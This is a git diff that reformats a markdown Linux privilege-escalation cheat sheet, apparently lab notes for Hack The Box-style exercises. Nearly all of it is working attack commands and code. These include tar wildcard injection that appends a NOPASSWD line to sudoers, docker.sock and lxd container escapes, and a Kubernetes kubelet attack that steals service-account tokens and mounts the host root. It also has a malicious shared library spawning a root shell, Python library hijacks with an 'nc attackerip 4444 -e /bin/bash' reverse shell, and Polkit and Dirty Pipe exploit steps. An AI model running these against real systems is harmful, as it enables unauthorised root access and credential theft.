@@ -224,9 +224,11 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
 # 2. **SUDO**
   List commands we can run with sudo.
+  
     ```bash
     sudo -l
     ```
+    
     ```bash
     cat /etc/sudoers
     ```
@@ -297,8 +299,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
       * `sudo LD_PRELOAD=/home/user/shell.so find`
 
-    ---
-
 ---
 
 # 3. **SUID / SGID**
@@ -325,7 +325,9 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
     ```bash
     getcap -r / 2>/dev/null
-    # OR
+    ```
+    
+    ```bash
     find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
     ```
 
@@ -356,28 +358,22 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   * **Wildcard Abuse** (**`*`** at the end of the cronjob/script)
 
-    It is the use of **wildcard characters** (`*`, `--option=value`, etc.) to **inject arguments into the command** called by a cronjob (usually with elevated privileges).
-
-    **BASICALLY** when there is a **`*`** at the end of a cronjob and we try to exploit it.
-
-    Example with `tar`, it is possible to abuse the **flag `--checkpoint-action=exec=`** to execute arbitrary commands.
-
-    ---
+    * It is the use of **wildcard characters** (`*`, `--option=value`, etc.) to **inject arguments into the command** called by a cronjob (usually with elevated privileges). **BASICALLY** when there is a **`*`** at the end of a cronjob and we try to exploit it. Example with `tar`, it is possible to abuse the **flag `--checkpoint-action=exec=`** to execute arbitrary commands.
 
     ```
     * * * * * root cd /somepath && tar -zcf backup.tar.gz *
     ```
 
-    When we locate the **`*`**, we check if we have write permission in the directory:
+    * When we locate the **`*`**, we check if we have write permission in the directory:
 
     ```bash
     cd /path
     touch test.txt
     ```
 
-    We then explore according to the cronjob (since we will change flags..).. research accordingly.
+    * We then explore according to the cronjob (since we will change flags..).. research accordingly.
 
-    **Ex → `tar`:**
+    * **Ex → `tar`:**
 
     ```bash
     echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
@@ -405,25 +401,29 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     echo $PATH
     ```
 
-  * we need to find directories/folders where we have write permission →
+  * We need to find directories/folders where we have write permission:
 
-    `find / -writable 2>/dev/null`
+    ```bash
+    find / -writable 2>/dev/null
+    ```
 
-    or
-
-    `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
+    ```bash
+    `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+    ```
 
   * Then we insert the directory we want at the beginning of PATH:
 
-    `export PATH=/var/www/html/data:$PATH`
-
+    ```bash
+    export PATH=/var/www/html/data:$PATH
+    ```
+    
   * And we create the file:
 
     * `cd /tmp`
-    * `echo “/bin/bash” > thm`
-    * `chmod 777 thm`
-
-  * Just run thm in another directory and without specifying it.
+    * `echo “/bin/bash” > bruh`
+    * `chmod 777 bruh`
+  
+  * Now just run it in another directory and without specifying it.
 
 ---
 
@@ -484,11 +484,11 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
 # 9. **Groups** (LXD, Docker, Disk, Adm)
 
-  Run **`id`** and see if we are in any of the groups below:
+  Run **`id`** and see if we are in any of the groups below.
 
-  * **LXD**
-
-    If the user belongs to the **`lxd`** group, they can **create containers**. With a privileged container + volume mount, you can **access the host filesystem as root**, even as a regular user.
+  ## **LXD**
+  
+  If the user belongs to the **`lxd`** group, they can **create containers**. With a privileged container + volume mount, you can **access the host filesystem as root**, even as a regular user.
 
     ```bash
     # Start LXD setup (use defaults):
@@ -508,7 +508,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     # Ex: https://academy.hackthebox.com/module/51/section/1588
     ```
 
-    **Create privileged container with access to host:**
+  Create privileged container with access to host:
 
     ```bash
     # Create the container with privileged permission:
@@ -522,7 +522,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     lxc exec pwnbox /bin/sh
     ```
 
-    Now with root access:
+  Now with root access:
 
     ```bash
     # Confirm root:
@@ -540,135 +540,135 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  * **Docker**
+  ## **Docker**
 
-    ## 1. Check if you are in a Docker container
+  ### 1. Check if you are in a Docker container
 
-    ```bash
-    cat /proc/1/cgroup
-    ```
+  ```bash
+  cat /proc/1/cgroup
+  ```
 
-    If you find lines with "docker", you are probably inside a container.
-
-    ---
-
-    ## 2. Check for mounted volumes (access to host filesystem)
-
-    ```bash
-    find / -type d -name '.ssh' 2>/dev/null
-    find / -type f -name 'id_rsa' 2>/dev/null
-    ```
-
-    If you find something like `/hostsystem/root/.ssh/id_rsa`, you can access the **host** via SSH if you copy the private key.
-
-    ---
-
-    ## 3. Check if you are in the `docker` group (outside container)
-
-    ```bash
-    id
-    ```
-
-    If it returns something like:
-
-    ```bash
-    uid=1000(user) gid=1000(user) groups=1000(user),116(docker)
-    ```
-
-    ---
-
-    ## 4. Check if Docker is installed and accessible
-
-    ```bash
-    which docker
-    docker ps
-    ```
-
-    ---
-
-    ## 5. If **docker.sock** is accessible, use it to escalate
-
-    ### 5.1 Check the socket
-
-    ```bash
-    ls -l /var/run/docker.sock
-    ```
-
-    ### 5.2 Create container with host root
-
-    ```bash
-    docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
-    ```
-
-    Now you have access to the **host root** inside the container.
-
-    ---
-
-    ## 6. If inside a container and **docker.sock** is available
-
-    ### 6.1 Download the Docker binary if it doesn't exist
-
-    ```bash
-    wget https://<YOUR-MACHINE-IP>:443/docker -O docker
-    chmod +x docker
-    ```
-
-    ### 6.2 List active containers via socket
-
-    ```bash
-    ./docker -H unix:///app/docker.sock ps
-    ```
-
-    ### 6.3 Run a new privileged container with host access
-
-    ```bash
-    ./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
-    ```
-
-    ### 6.4 Connect to the new container
-
-    ```bash
-    ./docker -H unix:///app/docker.sock exec -it <container-id> /bin/bash
-    ```
-
-    Now you can:
-
-    ```bash
-    cat /hostsystem/root/.ssh/id_rsa
-    ```
-
-    ---
-
-    ## 7. If you find exposed ENV variables (user, password etc.)
-
-    ```bash
-    strings /proc/*/environ | grep -i pass
-    ```
-
-    Or inside the container:
-
-    ```bash
-    printenv
-    ```
-
-    ---
-
-    ## 8. Other paths
-
-    * Check `.bash_history`, `.ssh`, `config.json`, automated scripts etc.
-    * Search dockerfiles and saved images with `docker image ls`
-    * Use `docker inspect` to look for mounted directories
-
-    ---
-
-    ## Notes
-
-    * Always try to exploit **mounted volumes first**, then `docker.sock`, then the `docker` group.
-    * Privileged containers allow mounting the host `/`: this gives **full root access**.
+  If you find lines with "docker", you are probably inside a container.
 
   ---
 
-  * **Disk**
+  ### 2. Check for mounted volumes (access to host filesystem)
+
+  ```bash
+  find / -type d -name '.ssh' 2>/dev/null
+  find / -type f -name 'id_rsa' 2>/dev/null
+  ```
+
+  If you find something like `/hostsystem/root/.ssh/id_rsa`, you can access the **host** via SSH if you copy the private key.
+
+  ---
+
+  ### 3. Check if you are in the `docker` group (outside container)
+
+  ```bash
+  id
+  ```
+
+  If it returns something like:
+
+  ```bash
+  uid=1000(user) gid=1000(user) groups=1000(user),116(docker)
+  ```
+
+  ---
+
+  ### 4. Check if Docker is installed and accessible
+
+  ```bash
+  which docker
+  docker ps
+  ```
+
+  ---
+
+  ### 5. If **docker.sock** is accessible, use it to escalate
+
+  #### 5.1 Check the socket
+
+  ```bash
+  ls -l /var/run/docker.sock
+  ```
+
+  ### 5.2 Create container with host root
+
+  ```bash
+  docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+  ```
+
+  Now you have access to the **host root** inside the container.
+
+  ---
+
+  ### 6. If inside a container and **docker.sock** is available
+
+  #### 6.1 Download the Docker binary if it doesn't exist
+
+  ```bash
+  wget https://<YOUR-MACHINE-IP>:443/docker -O docker
+  chmod +x docker
+  ```
+
+  #### 6.2 List active containers via socket
+
+  ```bash
+  ./docker -H unix:///app/docker.sock ps
+  ```
+
+  #### 6.3 Run a new privileged container with host access
+
+  ```bash
+  ./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+  ```
+
+  #### 6.4 Connect to the new container
+
+  ```bash
+  ./docker -H unix:///app/docker.sock exec -it <container-id> /bin/bash
+  ```
+
+  Now you can:
+
+  ```bash
+  cat /hostsystem/root/.ssh/id_rsa
+  ```
+
+  ---
+
+  ### 7. If you find exposed ENV variables (user, password etc.)
+
+  ```bash
+  strings /proc/*/environ | grep -i pass
+  ```
+
+  Or inside the container:
+
+  ```bash
+  printenv
+  ```
+
+  ---
+
+  ### 8. Other paths
+
+  * Check `.bash_history`, `.ssh`, `config.json`, automated scripts etc.
+  * Search dockerfiles and saved images with `docker image ls`
+  * Use `docker inspect` to look for mounted directories
+
+  ---
+
+  ### Notes
+
+  * Always try to exploit **mounted volumes first**, then `docker.sock`, then the `docker` group.
+  * Privileged containers allow mounting the host `/`: this gives **full root access**.
+
+  ---
+
+  ## **Disk**
 
     ```bash
     # Check partitions:
@@ -684,9 +684,9 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  * **Adm**
+  ## **Adm**
 
-    Being in this group, we have permission to read all logs inside **`/var/log`**
+  Being in this group, we have permission to read all logs inside **`/var/log`**
 
     ```bash
     # Read privileged logs:
@@ -702,7 +702,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
 # 10. **Others..**
 
-  * Screen (`screen -v`)
+  * **Screen** (`screen -v`)
 
     Screen version 4.5.0 → vulnerable.
     **`screen -v`**
@@ -711,7 +711,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
     ---
 
-  * Logrotate ****(`logrotate --version`)
+  * **Logrotate** (`logrotate --version`)
 
     Tool to manage log files on Linux.
 
@@ -724,13 +724,11 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     * 3.15.0
     * 3.18.0
 
-    ### Confirm that `logrotate` runs as root via cron
+    Confirm that `logrotate` runs as root via cron
 
     ```bash
     cat /etc/cron.daily/logrotate
     ```
-
-    *Why?*
 
     Cron usually runs `logrotate` as **root**. This is important because **even if the user does not have root privileges**, if they can manipulate the files monitored by `logrotate`, the process **can perform actions on their behalf as root**.
 
@@ -742,8 +740,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     cat /etc/logrotate.conf
     ls /etc/logrotate.d/
     ```
-
-    *Why?*
 
     These files show which **logs are being monitored** and how. Each entry defines a log path (e.g., `/var/log/nginx/*.log`) and associated rules (frequency, permissions, compression, etc.).
 
@@ -780,7 +776,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
       * Can be exploited in cases where compression invokes system utilities with controllable input.
 
-    *Why does this matter?*
 
     If logrotate is configured to **create new files as root**, but the user controls the log path, they can cause **creation of files in arbitrary locations as root**, for example `/etc/cron.d/backdoor`.
 
@@ -810,7 +805,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     }
     ```
 
-    *Why?*
 
     Here we see that:
 
@@ -830,7 +824,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     journalctl | grep logrotate
     ```
 
-    *Why?*
 
     Checks if it is running via cron or manually. This helps predict **when your payload will be processed** (e.g., when forcing rotation with `logrotate -f` during testing).
 
@@ -842,8 +835,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     echo "Malicious log injected by $(whoami)" >> /var/log/target.log
     ```
 
-    *Why?*
-
     If the log is **referenced in a logrotate configuration file** and you can write to it, it is possible to exploit rotation to manipulate files on the system (e.g., write to cron, .ssh, etc.).
 
     ---
@@ -853,8 +844,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     ```bash
     cat /var/lib/logrotate/status
     ```
-
-    *Why?*
 
     You can see when the last rotation occurred. This helps know if a new execution is near (daily, weekly, etc.).
 
@@ -867,8 +856,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     sudo logrotate -f /etc/logrotate.conf  # force rotation
     ```
 
-    *Why?*
-
     * `-d` shows what would be done, useful to understand the flow.
     * `-f` forces rotation and can help test during a CTF or HTB box if you have limited sudo.
 
@@ -876,390 +863,388 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  * **Kubernetes**
+  ## **Kubernetes**
 
-    ## 1. Check access to the Kubelet API
+  ### 1. Check access to the Kubelet API
 
-    ```bash
-    curl -k https://<IP>:10250/pods | jq .
-    ```
+  ```bash
+  curl -k https://<IP>:10250/pods | jq .
+  ```
 
-    If it returns a `PodList`, you have **anonymous access to the Kubelet API**.
-
-    ---
-
-    ## 2. List Pods with `kubeletctl`
-
-    Install (if necessary):
-
-    ```bash
-    go install github.com/cyberark/kubeletctl@latest
-    ```
-
-    Use:
-
-    ```bash
-    kubeletctl -i --server <IP> pods
-    ```
-
-    ---
-
-    ## 3. Look for Pods vulnerable to RCE
-
-    ```bash
-    kubeletctl -i --server <IP> scan rce
-    ```
-
-    Look for `RCE: +` → that pod allows remote command execution.
-
-    ---
-
-    ## 4. Execute commands in the pod (as root)
-
-    ```bash
-    kubeletctl -i --server <IP> exec "id" -p <pod_name> -c <container_name>
-    ```
-
-    ✔️ If it returns `uid=0(root)` → you have **root access inside the container**.
-
-    ---
-
-    ## 5. Steal the Service Account Token and Certificate
-
-    ```bash
-    kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee k8.token
-
-    kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> | tee ca.crt
-    ```
-
-    ---
-
-    ## 6. Test token permissions via `kubectl`
-
-    ```bash
-    export token=$(cat k8.token)
-
-    kubectl --token=$token \
-            --certificate-authority=ca.crt \
-            --server=https://<IP>:6443 \
-            auth can-i --list
-    ```
-
-    Check if the token has permission to create pods, read secrets, etc.
-
-    ---
-
-    ## 7. Create a malicious Pod mounting the host root
-
-    **privesc.yaml**:
-
-    ```yaml
-    apiVersion: v1
-    kind: Pod
-    metadata:
-      name: privesc
-      namespace: default
-    spec:
-      containers:
-      - name: privesc
-        image: nginx:1.14.2
-        volumeMounts:
-        - mountPath: /mnt/host
-          name: host-root
-      volumes:
-      - name: host-root
-        hostPath:
-          path: /
-      automountServiceAccountToken: true
-      hostNetwork: true
-    ```
-
-    ---
-
-    ## 8. Deploy the malicious Pod
-
-    ```bash
-    kubectl --token=$token \
-            --certificate-authority=ca.crt \
-            --server=https://<IP>:6443 \
-            apply -f privesc.yaml
-    ```
-
-    ---
-
-    ## 9. Access sensitive host files
-
-    ```bash
-    kubeletctl -i --server <IP> exec "cat /mnt/host/root/.ssh/id_rsa" -p privesc -c privesc
-    ```
-
-    Now you have **read the real host filesystem as root**.
-
-    ---
-
-    # Quick Reference Table
-
-    | Step | Goal                     | Main Command                    |
-    | ---- | ------------------------ | ------------------------------- |
-    | 1    | Test Kubelet API access  | `curl :10250/pods`              |
-    | 2    | List active Pods         | `kubeletctl pods`               |
-    | 3    | Identify vulnerable pods | `kubeletctl scan rce`           |
-    | 4    | Exec RCE on Pod          | `kubeletctl exec "id"`          |
-    | 5    | Dump Token and CA        | `cat /var/run/secrets/...`      |
-    | 6    | Test permissions         | `kubectl auth can-i`            |
-    | 7    | Create malicious Pod     | `kubectl apply -f privesc.yaml` |
-    | 8    | Access host files        | `cat /mnt/host/...`             |
-
-    ---
-
-  * **Shared Object Hijacking**
-
-    Dynamic programs use **`.so`** libraries to perform functions external to the main code.
-
-    If a binary with **SUID permission** (run as root) looks for a library from a **custom and vulnerable (writable)** path, we can **create a fake library** to run malicious code as **root**.
-
-    ---
-
-    Via SUID:
-
-    **`find / -perm -4000 -type f 2>/dev/null`**
-
-    Or other ways we find a binary, we use **ldd**:
-
-    **`ldd ./payroll`**
-
-    If some **`.so`** appears, for example:
-
-    **`libshared.so => /development/libshared.so`**
-
-    Check the PATH:
-    **`readelf -d /home/htb-student/shared_obj_hijack/payroll  | grep PATH`**
-
-    In the example it returns a directory called **`/development`**, which when we run **`ls -la`** we notice we have write permission, we can then run ldd again on the binary to know the function name:
-
-    **`./payroll`**
-
-    example output:
-
-    **`symbol lookup error: ./payroll: undefined symbol: dbquery`**
-
-    We then know the name is **`dbquery`**, so now we create the payload:
-
-    ```bash
-    // libshared.c
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-
-    void dbquery() {
-        printf("Malicious library loaded\n");
-        setuid(0);
-        system("/bin/sh -p");
-    }
-    ```
-
-    Compile and run again:
-    **`gcc src.c -fPIC -shared -o /development/libshared.so`**
-
-    **`./payroll`**
-
-    ---
-
-  * **Python Library Hijacking**
-
-    ### **WHEN TO INVESTIGATE?**
-
-    Use when you find **Python scripts** executed with **elevated privileges**, such as:
-
-    * **SUID bit:**
-
-      ```bash
-      find / -perm -4000 -type f -exec file {} \; 2>/dev/null | grep "Python"
-      ```
-
-    * **`sudo -l` with SETENV:**
-
-      ```bash
-      sudo -l | grep python
-      ```
-
-    * Python scripts used by privileged services
-
-    ---
-
-    ### **INDICATORS / QUICK CHECKLIST:**
-
-    1. **Python file executed as root?**
-
-       ```bash
-       ls -l script.py
-       sudo -l
-       ```
-
-    2. **Script imports third-party libraries?**
-
-       ```bash
-       grep import script.py
-       ```
-
-    3. **Are any import folders writable?**
-
-       ```bash
-       python3 -c 'import sys; print("\n".join(sys.path))'
-       ```
-
-       Then:
-
-       ```bash
-       ls -ld /usr/lib/python3.8
-       ls -ld /usr/local/lib/python3.8/dist-packages
-       ls -ld /tmp
-       ```
-
-    4. **Is any `.py` library used by the script editable?**
-
-       ```bash
-       grep -r "def" /path/to/module/
-       ls -l /path/to/module/*.py
-       ```
-
-    ---
-
-    ### **IF ANY OF THE ABOVE INDICATORS CONFIRM...**
-
-    ### **OPTION A – Direct hijack of an editable module**
-
-    ```python
-    def virtual_memory():
-        import os
-        os.system("id")
-    ```
-
-    Overwrite the real function in the vulnerable library with your version.
-
-    ---
-
-    ### **OPTION B – Path Hijacking (directory above the real one with write permission)**
-
-    ```bash
-    cd /usr/lib/python3.8/
-    echo 'def virtual_memory(): import os; os.system("id")' > psutil.py
-    ```
-
-    Python loads the highest priority version in `sys.path`.
-
-    ---
-
-    ### **OPTION C – Hijack via PYTHONPATH with SETENV**
-
-    ```bash
-    echo 'def virtual_memory(): import os; os.system("id")' > /tmp/psutil.py
-    sudo PYTHONPATH=/tmp/ /usr/bin/python3 script.py
-    ```
-
-    Works only if `sudo -l` shows `SETENV`.
-
-    ---
-
-    ## **POST-EXPLOITATION / ROOT SHELL**
-
-    Replace `os.system("id")` with:
-
-    ```python
-    os.system("chmod +s /bin/bash")  # or
-    os.system("nc attackerip 4444 -e /bin/bash")
-    ```
-
-    ---
-
-    ## QUICK MEMORY — KEY COMMANDS:
-
-    | Step                            | Command                                     |
-    | ------------------------------- | ------------------------------------------- |
-    | Find Python SUID scripts        | `find / -perm -4000 -type f -exec file {} ; |
-    | See imported modules            | `grep import script.py`                     |
-    | See Python paths                | `python3 -c 'import sys; print(sys.path)'`  |
-    | See directory permissions       | `ls -ld <path>`                             |
-    | See module permissions          | `ls -l /.../module.py`                      |
-    | See if `sudo` allows PYTHONPATH | `sudo -l`                                   |
+  If it returns a `PodList`, you have **anonymous access to the Kubelet API**.
 
   ---
 
-  * **0-Days (CVEs)**
+  ### 2. List Pods with `kubeletctl`
 
-    * **Sudo**
+  Install (if necessary):
 
-      ```bash
-      sudo -V | head -n1
-      ```
+  ```bash
+  go install github.com/cyberark/kubeletctl@latest
+  ```
 
-      Search for exploits.
+  Use:
 
-      ---
+  ```bash
+  kubeletctl -i --server <IP> pods
+  ```
 
-    * **Polkit**
+  ---
 
-      Try:
+  ### 3. Look for Pods vulnerable to RCE
 
-      **`pkexec -u root id`**
+  ```bash
+  kubeletctl -i --server <IP> scan rce
+  ```
 
-      To get a shell:
+  Look for `RCE: +` → that pod allows remote command execution.
 
-      ```bash
-      git clone https://github.com/arthepsy/CVE-2021-4034.git
-      cd CVE-2021-4034
-      gcc cve-2021-4034-poc.c -o poc
-      ./poc
-      ```
+  ---
 
-      ---
+  ### 4. Execute commands in the pod (as root)
 
-    * **Dirty Pipe**
+  ```bash
+  kubeletctl -i --server <IP> exec "id" -p <pod_name> -c <container_name>
+  ```
 
-      Vulnerability in the Linux kernel, where we can edit root files.
+  ✔️ If it returns `uid=0(root)` → you have **root access inside the container**.
 
-      **`5.8`** to **`5.17`**  ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847))
+  ---
 
-      To check if it is vulnerable:
+  ### 5. Steal the Service Account Token and Certificate
 
-      **`uname -r`**
+  ```bash
+  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee k8.token
 
-      ---
+  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> | tee ca.crt
+  ```
 
-      ```bash
-      git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
-      cd CVE-2022-0847-DirtyPipe-Exploits
-      # transfer all files to the target and then:
-      bash compile.sh
-      ```
+  ---
 
-      There are two versions of the exploit to use:
+  ### 6. Test token permissions via `kubectl`
 
-      ### Exploit-1
+  ```bash
+  export token=$(cat k8.token)
 
-      ```bash
-      ./exploit-1
-      ```
+  kubectl --token=$token \
+          --certificate-authority=ca.crt \
+          --server=https://<IP>:6443 \
+          auth can-i --list
+  ```
 
-      ### Exploit-2
+  Check if the token has permission to create pods, read secrets, etc.
 
-      ```bash
-      find / -perm -4000 2>/dev/null
-      # We choose some binary:
-      ./exploit-2 /usr/bin/sudo
-      ```
+  ---
 
-      ---
+  ### 7. Create a malicious Pod mounting the host root
 
-    * **Netfilter**
+  **privesc.yaml**:
 
-      ```bash
-      uname -r
-      ```
+  ```yaml
+  apiVersion: v1
+  kind: Pod
+  metadata:
+    name: privesc
+    namespace: default
+  spec:
+    containers:
+    - name: privesc
+      image: nginx:1.14.2
+      volumeMounts:
+      - mountPath: /mnt/host
+        name: host-root
+    volumes:
+    - name: host-root
+      hostPath:
+        path: /
+    automountServiceAccountToken: true
+    hostNetwork: true
+  ```
 
-      * **CVE-2021-22555**: Linux 2.6 – 5.11
-      * **CVE-2022-25636**: Linux 5.4 – 5.6.10
-      * **CVE-2023-32233**: Linux up to 6.3.1 (nf_tables enabled)
+  ---
+
+  ### 8. Deploy the malicious Pod
+
+  ```bash
+  kubectl --token=$token \
+          --certificate-authority=ca.crt \
+          --server=https://<IP>:6443 \
+          apply -f privesc.yaml
+  ```
+
+  ---
+
+  ### 9. Access sensitive host files
+
+  ```bash
+  kubeletctl -i --server <IP> exec "cat /mnt/host/root/.ssh/id_rsa" -p privesc -c privesc
+  ```
+
+  Now you have **read the real host filesystem as root**.
+
+  ---
+
+  # Quick Reference Table
+
+  | Step | Goal                     | Main Command                    |
+  | ---- | ------------------------ | ------------------------------- |
+  | 1    | Test Kubelet API access  | `curl :10250/pods`              |
+  | 2    | List active Pods         | `kubeletctl pods`               |
+  | 3    | Identify vulnerable pods | `kubeletctl scan rce`           |
+  | 4    | Exec RCE on Pod          | `kubeletctl exec "id"`          |
+  | 5    | Dump Token and CA        | `cat /var/run/secrets/...`      |
+  | 6    | Test permissions         | `kubectl auth can-i`            |
+  | 7    | Create malicious Pod     | `kubectl apply -f privesc.yaml` |
+  | 8    | Access host files        | `cat /mnt/host/...`             |
+
+    ---
+
+  ## **Shared Object Hijacking**
+
+  Dynamic programs use **`.so`** libraries to perform functions external to the main code.
+
+  If a binary with **SUID permission** (run as root) looks for a library from a **custom and vulnerable (writable)** path, we can **create a fake library** to run malicious code as **root**.
+
+  ---
+
+  Via SUID:
+
+  **`find / -perm -4000 -type f 2>/dev/null`**
+
+  Or other ways we find a binary, we use **ldd**:
+
+  **`ldd ./payroll`**
+
+  If some **`.so`** appears, for example:
+
+  **`libshared.so => /development/libshared.so`**
+
+  Check the PATH:
+  **`readelf -d /home/htb-student/shared_obj_hijack/payroll  | grep PATH`**
+
+  In the example it returns a directory called **`/development`**, which when we run **`ls -la`** we notice we have write permission, we can then run ldd again on the binary to know the function name:
+
+  **`./payroll`**
+
+  example output:
+
+  **`symbol lookup error: ./payroll: undefined symbol: dbquery`**
+
+  We then know the name is **`dbquery`**, so now we create the payload:
+
+  ```bash
+  // libshared.c
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <unistd.h>
+
+  void dbquery() {
+      printf("Malicious library loaded\n");
+      setuid(0);
+      system("/bin/sh -p");
+  }
+  ```
+
+  Compile and run again:
+  **`gcc src.c -fPIC -shared -o /development/libshared.so`**
+
+  **`./payroll`**
+
+    ---
+
+  ## **Python Library Hijacking**
+
+  Use when you find **Python scripts** executed with **elevated privileges**, such as:
+
+  * **SUID bit:**
+
+    ```bash
+    find / -perm -4000 -type f -exec file {} \; 2>/dev/null | grep "Python"
+    ```
+
+  * **`sudo -l` with SETENV:**
+
+    ```bash
+    sudo -l | grep python
+    ```
+
+  * Python scripts used by privileged services
+
+  ---
+
+  ### **INDICATORS / QUICK CHECKLIST:**
+
+  1. **Python file executed as root?**
+
+     ```bash
+     ls -l script.py
+     sudo -l
+     ```
+
+  2. **Script imports third-party libraries?**
+
+     ```bash
+     grep import script.py
+     ```
+
+  3. **Are any import folders writable?**
+
+     ```bash
+     python3 -c 'import sys; print("\n".join(sys.path))'
+     ```
+
+     Then:
+
+     ```bash
+     ls -ld /usr/lib/python3.8
+     ls -ld /usr/local/lib/python3.8/dist-packages
+     ls -ld /tmp
+     ```
+
+  4. **Is any `.py` library used by the script editable?**
+
+     ```bash
+     grep -r "def" /path/to/module/
+     ls -l /path/to/module/*.py
+     ```
+
+  ---
+
+  ### **IF ANY OF THE ABOVE INDICATORS CONFIRM...**
+
+  ### **OPTION A – Direct hijack of an editable module**
+
+  ```python
+  def virtual_memory():
+      import os
+      os.system("id")
+  ```
+
+  Overwrite the real function in the vulnerable library with your version.
+
+  ---
+
+  ### **OPTION B – Path Hijacking (directory above the real one with write permission)**
+
+  ```bash
+  cd /usr/lib/python3.8/
+  echo 'def virtual_memory(): import os; os.system("id")' > psutil.py
+  ```
+
+  Python loads the highest priority version in `sys.path`.
+
+  ---
+
+  ### **OPTION C – Hijack via PYTHONPATH with SETENV**
+
+  ```bash
+  echo 'def virtual_memory(): import os; os.system("id")' > /tmp/psutil.py
+  sudo PYTHONPATH=/tmp/ /usr/bin/python3 script.py
+  ```
+
+  Works only if `sudo -l` shows `SETENV`.
+
+  ---
+
+  ## **POST-EXPLOITATION / ROOT SHELL**
+
+  Replace `os.system("id")` with:
+
+  ```python
+  os.system("chmod +s /bin/bash")  # or
+  os.system("nc attackerip 4444 -e /bin/bash")
+  ```
+
+  ---
+
+  ## QUICK MEMORY — KEY COMMANDS:
+
+  | Step                            | Command                                     |
+  | ------------------------------- | ------------------------------------------- |
+  | Find Python SUID scripts        | `find / -perm -4000 -type f -exec file {} ; |
+  | See imported modules            | `grep import script.py`                     |
+  | See Python paths                | `python3 -c 'import sys; print(sys.path)'`  |
+  | See directory permissions       | `ls -ld <path>`                             |
+  | See module permissions          | `ls -l /.../module.py`                      |
+  | See if `sudo` allows PYTHONPATH | `sudo -l`                                   |
+
+  ---
+
+  ## **0-Days (CVEs)**
+
+  * **Sudo**
+
+    ```bash
+    sudo -V | head -n1
+    ```
+
+    Search for exploits.
+
+    ---
+
+  * **Polkit**
+
+    Try:
+
+    **`pkexec -u root id`**
+
+    To get a shell:
+
+    ```bash
+    git clone https://github.com/arthepsy/CVE-2021-4034.git
+    cd CVE-2021-4034
+    gcc cve-2021-4034-poc.c -o poc
+    ./poc
+    ```
+
+    ---
+
+  * **Dirty Pipe**
+
+    Vulnerability in the Linux kernel, where we can edit root files.
+
+    **`5.8`** to **`5.17`**  ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847))
+
+    To check if it is vulnerable:
+
+    **`uname -r`**
+
+    ---
+
+    ```bash
+    git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+    cd CVE-2022-0847-DirtyPipe-Exploits
+    # transfer all files to the target and then:
+    bash compile.sh
+    ```
+
+    There are two versions of the exploit to use:
+
+    ### Exploit-1
+
+    ```bash
+    ./exploit-1
+    ```
+
+    ### Exploit-2
+
+    ```bash
+    find / -perm -4000 2>/dev/null
+    # We choose some binary:
+    ./exploit-2 /usr/bin/sudo
+    ```
+
+    ---
+
+  * **Netfilter**
+
+    ```bash
+    uname -r
+    ```
+
+    * **CVE-2021-22555**: Linux 2.6 – 5.11
+    * **CVE-2022-25636**: Linux 5.4 – 5.6.10
+    * **CVE-2023-32233**: Linux up to 6.3.1 (nf_tables enabled)
 
 ---
 
